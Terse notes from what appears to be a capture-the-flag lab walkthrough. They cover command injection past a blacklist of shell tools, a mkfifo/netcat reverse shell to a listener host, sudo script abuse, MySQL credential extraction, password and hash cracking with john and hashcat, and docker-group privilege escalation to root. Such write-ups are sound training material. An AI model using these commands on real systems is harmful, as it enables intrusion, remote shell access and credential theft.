21 vsftpd 3.0.3  
22 OpenSSH 7.6p1  
80 Apache httpd 2.4.29 ((Ubuntu))
 
/secret
 
try some commands, see that "id" works. Try id&ls works. So use this pattern.
 
**id&cat index.php (view page source)**  
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
 
**id&cat /etc/passwd (found users and a mysql server):**  
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash  
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false  
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash  
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
 
**Use netcat to get rev shell; start nc listener on local machine and run:**  
id&rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.29.79 1234 >/tmp/f
 
sudo -l  
**www-data can run a script AS user apaar:**  
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
 
cat .helpline.sh, see it runs command as $msg  
sudo -u apaar /home/apaar/.helpline.sh  
msg= /bin/bash -p
 
**to find the mysql server running internally:**  
netstat -tnl  
127.0.0.1:9001  
127.0.0.1:3306
 
curl both of these, see that 9001 works and gives us html login. where might an html file be at?
 
look around and find this dir that has mysql files: /var/www/files/  
find index.php in and it has mysql creds:  
**"mysql:dbname=webportal;host=localhost","root","!@m+her00+@db"**
 
account.php:  
SELECT * FROM users WHERE username='$un' AND password='$pw'
 
in images:  
wget hacker-with-laptop_23-2147985341.jpg (on local machine)
 
steghide extract -sf PIC
 
zip2john backup.zip > forjohn.txt  
john --wordlist=rockyou.txt forjohn.txt
 
pass1word  
unzip backup.zip : pass1word
 
source_code.php  
base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA=="  
echo "Welcome Anurodh!";
 
Anurodh:!d0ntKn0wmYp@ssw0rd
 
su anurodh (on target machine)  
[learned how to move laterally]
 
c--------------------c **rabbit hole:**  
remember mysql, so login with root creds we found earlier:
 
mysql -h localhost -u root -p webportal  
p: !@m+her00+@db
 
SHOW TABLES  
SELECT * FROM users
 
id | firstname | lastname | username | password |  
+----+-----------+----------+-----------+----------------------------------+  
| 1 | Anurodh | Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd |  
| 2 | Apaar | Dahal | cullapaar | 686216240e5af30df0501e53c789a649
 
**Crack them (md5):**  
hashcat -a 0 -m 0 hash.txt ../rockyou.txt
 
Anurodh: masterpassword  
Apaar: dontaskdonttell  
c--------------------c
 
**logged in as anurodh, check his "id":**  
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),**999(docker)**  
**looks like he is in docker group, so can run docker commands. search gtfobins for docker priv esc:**  
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
cat /root/proof.txt
 
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
 
unshadow passwd shadow > hash.txt  
john --format=sha512crypt --wordlist=rockyou.txt hash.txt
 
passwd (to change root passwd, don’t need to know original pass)
 
LL:  
evading server-side php filter  
getting rev shell through webshell with mkfifo piped nc command  
running a sudo command as a different user  
logging into mysql and getting table data  
using docker for privesc